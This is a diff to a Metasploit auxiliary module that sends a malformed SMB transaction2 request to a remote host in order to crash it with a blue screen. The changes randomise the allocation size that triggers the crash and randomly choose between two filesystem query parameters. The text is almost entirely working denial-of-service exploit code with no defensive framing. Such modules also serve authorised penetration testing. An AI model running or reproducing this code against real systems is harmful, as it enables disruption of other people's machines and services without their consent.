@@ -47,7 +47,8 @@ class Metasploit3 < Msf::Auxiliary
 	# Perform a transaction2 request using the specified subcommand, parameters, and data
 	def malformed_trans2(subcommand, param = '', body = '')
 
-		alloc_sz = 0 # between 0-8 causes a crash
+		# values < 0xc (not inclusive) causes a crash
+		alloc_sz = rand(0x0c)
 
 		setup_count = 1
 		setup_data = [subcommand].pack('v')
@@ -106,7 +107,12 @@ class Metasploit3 < Msf::Auxiliary
 		simple.connect("\\\\#{datastore['RHOST']}\\#{datastore['SMBSHARE']}")
 
 		print_status("Sending malformed trans2 request..")
-		malformed_trans2(0x03, "\x05\x01")
+		params = [
+			"\x05\x01",  # Query FS Attribute Info (0x0105)
+			"\x02\x01"   # Query FS Volume Info (0x0102)
+		]
+		idx = rand(params.length)
+		malformed_trans2(0x03, params[idx])
 
 		print_status("The target should encounter a blue screen error now.")
 		select(nil, nil, nil, 0.5)
